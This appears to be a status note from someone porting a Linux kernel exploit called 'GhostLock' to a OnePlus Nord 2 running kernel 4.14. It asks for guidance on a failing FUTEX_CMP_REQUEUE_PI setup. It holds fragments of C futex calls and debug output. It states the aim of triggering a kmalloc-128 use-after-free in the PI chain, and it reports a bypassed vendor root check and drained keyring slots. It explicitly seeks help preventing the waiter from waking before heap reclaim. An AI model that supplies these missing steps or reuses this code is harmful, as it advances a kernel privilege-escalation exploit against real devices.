# GhostLock Port Status - Need Guidance on Futex/PI Mechanism

## Current Blocker: FUTEX_CMP_REQUEUE_PI returns EINVAL

### Setup
```
1. Owner thread locks f_pi_target with FUTEX_LOCK_PI ✓
2. Waiter thread calls FUTEX_WAIT_REQUEUE_PI on f_wait -> f_pi_target
3. Main thread calls FUTEX_CMP_REQUEUE_PI -> EINVAL
```

### Observed Values
```
key_owner: locked f_pi_target, ret=0 errno=0  (success)
f_pi_target = <owner_tid>  (owner TID stored in futex)
f_wait = 0
FUTEX_CMP_REQUEUE_PI returns 1 with errno=22 (EINVAL)
```

### Questions

1. **Why does FUTEX_CMP_REQUEUE_PI return EINVAL?**
   - `f_wait != f_pi_target` (different addresses)
   - `nr_wake=1, nr_requeue=1` (valid values)
   - `cmpval=f_wait` (should match)
   - Could there be an issue with PI futex initialization?

2. **Alternative approach: Direct FUTEX_LOCK_PI on f_pi_target**
   - Tried having waiter call FUTEX_LOCK_PI directly on f_pi_target
   - Returns ETIMEDOUT quickly (should block for 10 seconds)
   - Why doesn't it block properly?

3. **GhostLock original mechanism**
   - The original uses FUTEX_CMP_REQUEUE_PI successfully
   - What's the correct futex setup sequence?
   - Do we need FUTEX_WAIT_REQUEUE_PI or is there another way?

4. **Simplest path to UAF**
   - We need: waiter allocated in kmalloc-128, then freed while still in PI chain
   - Current approach: owner holds lock, waiter blocks, owner unlocks -> waiter wakes and frees
   - How to prevent waiter from waking before we reclaim?

### Code Structure
```c
// Owner thread
futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);  // Locks successfully

// Waiter thread  
atomic_store(&waiter_waiting, 1);
futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);

// Main thread
futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void*)1, &f_pi_target, 0);  // EINVAL!
```

### Device State
- Device: OnePlus Nord 2, kernel 4.14.186+
- No crashes, no reboots (oplus_root_check bypassed with FUTEX_LOCK_PI approach)
- Keys drain successfully (6500/6500)
- Need to get past futex setup to trigger actual UAF
